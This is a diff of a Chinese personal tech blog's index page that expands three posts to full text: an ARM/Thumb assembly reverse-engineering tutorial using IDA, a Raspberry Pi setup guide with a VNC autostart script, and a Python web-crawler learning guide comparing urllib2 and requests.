+<h3 id="比较指令的大用处"><a href="#比较指令的大用处" class="headerlink" title="比较指令的大用处"></a>比较指令的大用处</h3><p><strong>Compare 指令：cmp r0,#1</strong></p>
+<p><strong>完成操作:</strong></p>
+<ol>
+<li>减法运算(不保存结果)</li>
+<li>根据结果更新标志位</li>
+</ol>
+<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h4 id="APSR-寄存器"><a href="#APSR-寄存器" class="headerlink" title="APSR 寄存器"></a>APSR 寄存器</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/I6IjBIEGhG.png?imageslim" alt="mark"></p>
+<p><strong>标志寄存器是条件执行的基础。</strong><br>N、Z、C、V用于条件标志位<br>N - 负数标志位<br>Z - 零标志位<br>C - 进位标志位<br>V - 溢出标志位</p>
+<p>比如，若减法运算之后为负数，则N为1；为0，则Z=1；</p>
+<h5 id="一些会修改标志位的指令"><a href="#一些会修改标志位的指令" class="headerlink" title="一些会修改标志位的指令"></a>一些会修改标志位的指令</h5><p><strong>1. 指令后缀带S的指令，例如(MOVS)</strong></p>
+<p><strong>2. TST(and)、TEQ(or)、CMN(add)、CMP(sub)</strong></p>
+<p>例如MOVS之后的到的值为0，那么Z就被置位（为1）</p>
+<p><strong>完整一点的例子</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/debffk3A60.png?imageslim" alt="完整一点的例子"></p>
+<blockquote>
+<p>这里if有两种可能，一种是a&lt;=10，一种是a&gt;10；</p>
+<p>在汇编中<strong>先cmp a,#10</strong></p>
+<p>然后<strong>选择if括号内相反的选项</strong> bgt next1 (大于则跳转出去)</p>
+<p>然后在这<strong>中间填入if代码块中的内容</strong></p>
+</blockquote>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p><strong>打开程序</strong></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/eAf963eelJ.png?imageslim" alt="mark"></p>
+<p><strong>导出表</strong></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/65Ab19GkKH.png?imageslim" alt="mark"></p>
+<p><a href="http://blog.csdn.net/hgy413/article/details/6598043" target="_blank" rel="noopener">http://blog.csdn.net/hgy413/article/details/6598043</a></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/ijeK017DDJ.png?imageslim" alt="mark"></p>
+<p><strong>libc</strong>init的第三个参数（R2）是main函数的地址</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/kljAI65kFj.png?imageslim" alt="mark"></p>
+<p>跳入main函数之后发现IDA未能把ARM指令集识别正确。需要手动（ALT+G) </p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/DLeG0i8IIb.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/dmfLIFbgC6.png?imageslim" alt="mark"></p>
+<p>随便输入一个不等于0x0的数</p>
+<p>全部改好之后就识别出来了</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/2JFelgFi6a.png?imageslim" alt="mark"></p>
+<p><strong>程序源码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">0</span>,b = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is condition statements re test!\nPlease input two number:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">	<span class="keyword">if</span>(a + b == <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[if]a+b=10\b"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[if-else-1]a &gt; b\n"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[if-else-if] a==b\n"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[if-else] a&lt;b \n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a &gt; <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a &lt;= <span class="number">20</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[nest if]\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"a &gt; 10\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>自己调试一下</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/I58CbF6A6C.png?imageslim" alt="mark"></p>
+<h2 id="生成thumb代码"><a href="#生成thumb代码" class="headerlink" title="生成thumb代码"></a>生成thumb代码</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/jkcGKL7fbH.png?imageslim" alt="mark"><br>BL的下一条指令的地址被保存在LR寄存器中</p>
+<p>调用gcc的内建函数，R0作为参数</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/7EilLlHJfE.png?imageslim" alt="mark"></p>
+<p>==R1=LR=57C（待调试）==</p>
+<p>==R1=R1+2=57E（待调试）==</p>
+<font color="#ff0000"><strong>地址做移位是为了对齐（如这里的R1），而数移位是为了做乘除法（如这里的R0）</strong></font>
 
-ARM传参，R0-R3传递前四个参数
-1. Thumb 指令集特点
-Thumb 指令集指令长度：16或32，16为为主
-Thumb-16 大部分只能访问前8个寄存器 R0-R7（少数可以访问R8-R15）
-Thumb-32 可以访问所有的ARM core 寄存器 R0-R15
+<p>LSRS:  R1=R1右移两位</p>
+<p>LSLS：R0=R0左移两位=R0*4</p>
+<p>LSLS：R1=R1左移两位 //<strong>先右移再左移，清除R1原来的最低位，用于对齐，</strong>==得到0x580（待调试）==</p>
+<p>LDR：R0=[R1+R0] =[580+原来的R0<em>4] //假设原来的R0=1，则R0=[580+原来R0</em>4]=[580+4]=[0x584]=<strong>loc_59C-0x580</strong></p>
+<p>ADDS: R0=R0+R1=loc_59C</p>
+<p>MOV: LR=loc_59C</p>
+<p>POP: 恢复寄存器R0，R1</p>
+<p>MOV: PC=loc_59C;函数结束，跳转到case：选中的代码块</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/7dha4ei960.png?imageslim" alt="mark"></p>
+<p>这些不是代码，是长为4字节的数据项，每一项都是偏移值，<strong>这个偏移值+0x580就能找到真正的代码</strong></p>
+<h2 id="生成ARM代码"><a href="#生成ARM代码" class="headerlink" title="生成ARM代码"></a>生成ARM代码</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/e64JgLd8gc.png?imageslim" alt="mark"></p>
+<p>ADDLS：PC=PC+（R3*4）</p>
+<p>PC的PC寄存器指向的不是下条指令，是下下条指令（也就是当前指令地址+8）</p>
+<h6 id="CEMU测试"><a href="#CEMU测试" class="headerlink" title="CEMU测试"></a>CEMU测试</h6><h6 id="bl-funl-把LR设置为BL指令的下一条地址"><a href="#bl-funl-把LR设置为BL指令的下一条地址" class="headerlink" title="bl funl //把LR设置为BL指令的下一条地址"></a>bl funl //把LR设置为BL指令的下一条地址</h6><h6 id="fun1"><a href="#fun1" class="headerlink" title="fun1:"></a>fun1:</h6><h6 id="mov-r0-pc"><a href="#mov-r0-pc" class="headerlink" title="mov r0,pc"></a>mov r0,pc</h6><h6 id="mov-r1-lr"><a href="#mov-r1-lr" class="headerlink" title="mov r1,lr"></a>mov r1,lr</h6><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/KKmHecaK8C.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/D69cGmkeCF.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/G319AEKc61.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/k7eHK6CLmf.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/4FgIA8aDcm.png?imageslim" alt="mark"></p>
+<p>差了8个字节</p>
+<h2 id="关于ARM中的寄存器PC"><a href="#关于ARM中的寄存器PC" class="headerlink" title="关于ARM中的寄存器PC"></a>关于ARM中的寄存器PC</h2><p><a href="http://blog.csdn.net/tigerjibo/article/details/6050649" target="_blank" rel="noopener">http://blog.csdn.net/tigerjibo/article/details/6050649</a></p>
+<p><a href="http://blog.csdn.net/lee244868149/article/details/49488575" target="_blank" rel="noopener">http://blog.csdn.net/lee244868149/article/details/49488575</a></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/8Fg5394hJj.png?imageslim" alt="mark"></p>
+<p>从图中可以看出，一条汇编指令的运行有三个步骤，取指、译码、执行，当第一条汇编指令取指完成后，紧接着就是第二条指令的取指，然后第三条…如此嵌套</p>
+<p>其实很容易看出，第一条指令：</p>
+<p>add r0, r1,$5</p>
+<p>取指完成后，PC就指向了第二条指令，此时PC=PC+4</p>
+<p>当第一条指令译码完成以后，此时PC=PC+8</p>
+<p>所以第一条指令开始执行时，PC值已经加了8</p>
+<p>所以必须记住这个前提，在arm中，每次该指令执行时，其实这时的PC值是PC=PC+8</p>
+<p>而且这个前提也同样适合多级流水线，原因就不解释了</p>
 
-更小、更加灵活
-
-2. ARM指令集特点
-指令长度32位，4字节对齐
-功能更加完善
-
-对比
-
-
-Thumb
-ARM
-
-
-
-
-2字节对齐
-4字节对齐
-
-
-占用空间少、密度高
-占用空间较多
-
-
-功能不齐全
-功能齐全
-
-
-
-ARM和Thumb指令集各有自己的优点，取长补
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/18/arm1/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
         
       
     </div>
@@ -852,7 +898,7 @@ ARM和Thumb指令集各有自己的优点，取长补
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -914,17 +960,6 @@ ARM和Thumb指令集各有自己的优点，取长补
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/15/raspberry_quick_start/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/15/raspberry_quick_start/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -951,22 +986,40 @@ ARM和Thumb指令集各有自己的优点，取长补
       
         
           
-          1. 下载烧录镜像镜像下载地址
-http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
-写入sd卡（需要一个读卡器
-下载etcher
+            <h2 id="1-下载烧录镜像"><a href="#1-下载烧录镜像" class="headerlink" title="1. 下载烧录镜像"></a>1. 下载烧录镜像</h2><p><a href="http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/" target="_blank" rel="noopener">镜像下载地址</a></p>
+<p><a href="http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/" target="_blank" rel="noopener">http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/</a></p>
+<p>写入sd卡（需要一个读卡器</p>
+<p><a href="https://etcher.io/" target="_blank" rel="noopener">下载etcher</a></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/jhlaJBmHh2.png?imageslim" alt="mark"></p>
+<h2 id="2-镜像烧好后"><a href="#2-镜像烧好后" class="headerlink" title="2. 镜像烧好后"></a>2. 镜像烧好后</h2><p><strong>在boot路径下新建一个命名为ssh(无后缀）的空白文件,使得ssh默认开启。</strong></p>
+<p>参考这个用一根网线连接电脑去操作（windows）<br> <a href="http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html</a></p>
+<p> 或者和我一样用一根网线直接插在路由器后面</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/jI44KDfLbD.png?imageslim" alt="mark"></p>
+<p>也可以不用网线，直接配置无线上网，不赘述。<a href="http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html</a></p>
+<h2 id="3-远程连接"><a href="#3-远程连接" class="headerlink" title="3.远程连接"></a>3.远程连接</h2><p>找到ip后用ssh远程连接，默认账号密码为</p>
+<p>user:pi</p>
+<p>password:raspberry</p>
+<h2 id="4-换源"><a href="#4-换源" class="headerlink" title="4.换源"></a>4.换源</h2><p>修改/etc/apt/sources.list为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># deb http://mirrordirector.raspbian.org/raspbian/ jessie main contrib non-free rpi</span><br><span class="line"># Uncomment line below then &apos;apt-get update&apos; to enable &apos;apt-get source&apos;</span><br><span class="line"># deb-src http://archive.raspbian.org/raspbian/ jessie main contrib non-free rpi</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ jessie main ui</span><br></pre></td></tr></table></figure>
+<p>sudo apt-get update</p>
+<h2 id="5-安装vim"><a href="#5-安装vim" class="headerlink" title="5.安装vim"></a>5.安装vim</h2><p>sudo apt-get install vim</p>
+<h2 id="6-释放限制空间（封印解除"><a href="#6-释放限制空间（封印解除" class="headerlink" title="6.释放限制空间（封印解除"></a>6.释放限制空间（封印解除</h2><p>sudo raspi-config</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/7GK1f062B3.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/fmG7j880l6.png?imageslim" alt="mark"></p>
+<h2 id="打开vnc"><a href="#打开vnc" class="headerlink" title="打开vnc"></a>打开vnc</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/g5GE31H6j6.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/2l93FIKKIB.png?imageslim" alt="mark"></p>
+<h4 id="vnc开机自启动设置"><a href="#vnc开机自启动设置" class="headerlink" title="vnc开机自启动设置"></a>vnc开机自启动设置</h4><p>vim  /etc/init.d/vncserver</p>
+<p>然后 复制下面的内容 右键粘贴进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          vncserver</span><br><span class="line"># Required-Start:    $local_fs</span><br><span class="line"># Required-Stop:     $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: Start/stop vncserver</span><br><span class="line">### END INIT INFO</span><br><span class="line"> </span><br><span class="line"># More details see:</span><br><span class="line"># http://www.penguintutor.com/linux/vnc</span><br><span class="line"> </span><br><span class="line">### Customize this entry</span><br><span class="line"># Set the USER variable to the name of the user to start vncserver under</span><br><span class="line">export USER=&apos;pi&apos;</span><br><span class="line">### End customization required</span><br><span class="line"> </span><br><span class="line">eval cd ~$USER</span><br><span class="line"> </span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">    # 启动命令行。此处自定义分辨率、控制台号码或其它参数。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -depth 16 -geometry 1024x768 :1&apos;</span><br><span class="line">    echo &quot;Starting VNC server for $USER &quot;</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">    # 终止命令行。此处控制台号码与启动一致。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -kill :1&apos;</span><br><span class="line">    echo &quot;vncserver stopped&quot;</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: /etc/init.d/vncserver &#123;start|stop&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure></p>
+<h5 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h5><p>sudo chmod 755 /etc/init.d/vncserver</p>
+<h5 id="添加开机启动项"><a href="#添加开机启动项" class="headerlink" title="添加开机启动项"></a>添加开机启动项</h5><p>sudo update-rc.d vncserver defaults</p>
+<h5 id="最后-重启树莓派"><a href="#最后-重启树莓派" class="headerlink" title="最后 重启树莓派"></a>最后 重启树莓派</h5><p>sudo reboot</p>
+<h5 id="安装VNC-Viewer"><a href="#安装VNC-Viewer" class="headerlink" title="安装VNC Viewer"></a>安装VNC Viewer</h5><p>链接：<a href="https://pan.baidu.com/s/1jJAy7bg" target="_blank" rel="noopener">https://pan.baidu.com/s/1jJAy7bg</a> 密码：gnyy</p>
+<p>输入ip:1</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/9dC1C8d8Eg.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/eBh80HfKlB.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/0bbcHg69fD.png?imageslim" alt="mark"></p>
 
-2. 镜像烧好后在boot路径下新建一个命名为ssh(无后缀）的空白文件,使得ssh默认开启。
-参考这个用一根网线连接电脑去操作（windows） http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html
- 或者和我一样用一根网线直接插
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/15/raspberry_quick_start/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
         
       
     </div>
@@ -1018,7 +1071,7 @@ http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1080,17 +1133,6 @@ http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/18/crawler/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/18/crawler/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -1117,23 +1159,105 @@ http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
       
         
           
+            <p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/171045447.jpg" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/171146510.png" alt="mark"></p>
+<h2 id="书籍推荐："><a href="#书籍推荐：" class="headerlink" title="书籍推荐："></a>书籍推荐：</h2><p>《python核心编程》/《python语言及其应用》-&gt;《python cookbook》 </p>
+<p>《用Python写网络爬虫》</p>
+<h2 id="python-爬虫实践文章"><a href="#python-爬虫实践文章" class="headerlink" title="python/爬虫实践文章"></a>python/爬虫实践文章</h2><p><a href="https://juejin.im/post/58dce2248d6d8100613a4cfb" target="_blank" rel="noopener">https://juejin.im/post/58dce2248d6d8100613a4cfb</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21479334</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25633789" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25633789</a></p>
+<p><a href="https://xlzd.me/tag/crawler/" target="_blank" rel="noopener">https://xlzd.me/tag/crawler/</a></p>
+<p><a href="http://dongweiming.github.io/Expert-Python/#1" target="_blank" rel="noopener">http://dongweiming.github.io/Expert-Python/#1</a></p>
+<h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><p>熟悉了python语法之后，写了一两个就入门了。网上有很多爬虫的文章，<strong>但是一定要自己动手去写</strong></p>
+<p><strong>初级文章读一百篇和读一两篇是一样的，除了浪费时间以外。</strong> </p>
+<p>另外，初学者没必要一上来就做很大很有成就感的事情，可以先写个简单的，然后不断给自己正向反馈。</p>
+<p>比如可以先只是将数据在终端打印出来，然后再渐渐将数据规整化了以后保存到本地的数据库或者文件里面，然后再考虑提高效率，还有一些比较高深的技巧，比如研究分布式呀、断点续爬，怎么控制不同的worker。</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/172146533.png" alt="mark"></p>
+<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/160246823.png" alt="mark"></p>
+<h2 id="怎么使用这个思维导图？"><a href="#怎么使用这个思维导图？" class="headerlink" title="怎么使用这个思维导图？"></a>怎么使用这个思维导图？</h2><p>先从右上角开始，了解http的内容，然后再学抓取工具。</p>
+<h3 id="关于抓取工具"><a href="#关于抓取工具" class="headerlink" title="关于抓取工具"></a>关于抓取工具</h3><ul>
+<li>Chrome和firebug选其一即可。</li>
+<li>Tamper Data是一个篡改数据、截停请求的调试器。</li>
+<li>fiddler 能记录所有客户端的http和https请求，监视、设置断点，修改输入输出的数据。</li>
+<li>Charles 抓包工具，主要用来抓取手机的包。Web端的抓取策略可能比较复杂和严格，但是在移动端要简单的多。我一般写爬虫就是先看一下有没有开放的API，如果没有的话再看手机端。<br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483927&amp;idx=1&amp;sn=3c7be971f8baf5a3d9e4e55b700aba0f&amp;chksm=9f76aea1a80127b70fe3f777a1cfe2c2c4a54c84e5c99772f528d0bf8d606d472675330558fe#rd" target="_blank" rel="noopener">移动端爬虫的一个栗子</a>    </li>
+</ul>
+<h3 id="关于请求库"><a href="#关于请求库" class="headerlink" title="关于请求库"></a>关于请求库</h3><p>个人最推荐requests而完全不推荐按照urllib或者urllib2的方式来写。因为requests帮你考虑的东西更多，比如标准库里往往是默认不支持gzip压缩的，而requests会自动的压缩，而这往往能减少大量的压缩时间。<br>此外，由于历史原因，标准库的写法冗杂而不优雅，比起高度封装的requests用起来要麻烦的多。</p>
+<p>举个栗子：</p>
+<p>①urllib2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> cookielib <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></span><br><span class="line"></span><br><span class="line">req = urllib2.Request(hb_url)</span><br><span class="line"></span><br><span class="line">password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">password_manager.add_password(<span class="keyword">None</span>, hb_url, <span class="string">'user'</span>, <span class="string">'pass'</span>)</span><br><span class="line"></span><br><span class="line">auth_manager = urllib2.HTTPBasicAuthHandler(password_manager)</span><br><span class="line"></span><br><span class="line">cj = CookieJar()</span><br><span class="line">cookie_manager = urllib2.HTTPCookieProcessor(cj)</span><br><span class="line"></span><br><span class="line">proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1'</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = urllib2.build_opener(auth_manager, cookie_manager, proxy_handler)</span><br><span class="line"></span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line"></span><br><span class="line">handler = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> handler.getcode()</span><br><span class="line"><span class="keyword">print</span> handler.headers.getheader(<span class="string">'content-type'</span>)</span><br><span class="line">data = json.load(handler)</span><br><span class="line"><span class="keyword">print</span> data[<span class="string">'authenticated'</span>]</span><br><span class="line"><span class="comment"># ------</span></span><br><span class="line"><span class="comment"># 200</span></span><br><span class="line"><span class="comment"># 'application/json'</span></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></p>
+<p>②requests<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://127.0.0.1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(hb_url, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>), proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.status_code</span><br><span class="line"><span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</span><br><span class="line"><span class="keyword">print</span> r.json()[<span class="string">'authenticated'</span>]</span><br></pre></td></tr></table></figure></p>
+<h3 id="关于解析库"><a href="#关于解析库" class="headerlink" title="关于解析库"></a>关于解析库</h3><ul>
+<li>beautiful soap: 页面处理更友好，代码直观，但是解析比较慢，对于页面的处理比较绕。</li>
